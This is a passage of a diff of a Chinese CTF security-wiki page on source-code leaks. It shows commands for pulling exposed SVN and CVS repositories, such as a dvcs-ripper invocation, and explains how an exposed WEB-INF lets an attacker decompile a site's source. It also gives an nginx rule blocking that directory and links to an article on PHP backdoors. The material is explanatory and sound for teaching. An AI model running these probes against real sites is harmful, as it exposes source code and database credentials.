class=sr>^/WEB-INF/*</span> <span class=p>{</span> <span class=kn>deny</span> <span class=s>all</span><span class=p>;</span> <span class=p>}</span> <span class=c1># 或者return 404; 或者其他！</span>
-</code></pre></div> <h3 id=cvs>CVS 泄露<a class=headerlink href=#cvs title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>http://url/CVS/Root 返回根信息
-http://url/CVS/Entries 返回所有文件的结构
-</code></pre></div> <p>取回源码</p> <div class=highlight><pre><span></span><code>bk clone http://url/name dir
-</code></pre></div> <h3 id=_21>参考文献<a class=headerlink href=#_21 title="Permanent link">&para;</a></h3> <ul> <li><a href=https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html>记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../ssrf/ class="md-footer__link md-footer__link--prev" aria-label="上一页: SSRF" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> SSRF </div> </div> </a> <a href=../../../blockchain/introduction/ class="md-footer__link md-footer__link--next" aria-label="下一页: BlockChain Security Overview" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> BlockChain Security Overview </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2020 - 2021 Conflux Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../../assets/javascripts/workers/search.477d984a.min.js", "version": null}</script> <script src=../../../assets/javascripts/bundle.ddd52ceb.min.js></script> <script src=https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js></script> <script src=../../../static/js/extra.js></script> <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script> </body> </html>
+/.svn/entries</code></pre>
+<p><a href="https://github.com/kost/dvcs-ripper">dvcs-ripper</a></p>
+<pre class="highlight"><code class="language-shell">perl rip-svn.pl -v -u http://www.example.com/.svn/</code></pre>
+<p><a href="http://tools.40huo.cn/#!web.md#源码泄露">Seay - SVN</a></p>
+<h3 id="web-inf-webxml">WEB-INF / web.xml 泄露<a class="headerlink" href="#web-inf-webxml" title="Permanent link">&para;</a></h3>
+<p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p>
+<p>WEB-INF 主要包含一下文件或目录：</p>
+<ul>
+<li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
+<li><code>/WEB-INF/classes/</code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 jar 文件中。</li>
+<li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li>
+<li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li>
+<li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li>
+</ul>
+<p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p>
+<pre class="highlight"><code class="language-nginx">location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！</code></pre>
+<h3 id="cvs">CVS 泄露<a class="headerlink" href="#cvs" title="Permanent link">&para;</a></h3>
+<pre class="highlight"><code>http://url/CVS/Root 返回根信息
+http://url/CVS/Entries 返回所有文件的结构</code></pre>
+<p>取回源码</p>
+<pre class="highlight"><code class="language-shell">bk clone http://url/name dir</code></pre>
+<h3 id="_21">参考文献<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></li>
+</ul></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 - 2021 Conflux Wiki Team</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js" defer></script>
+        <script src="../../../static/js/extra.js" defer></script>
+        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
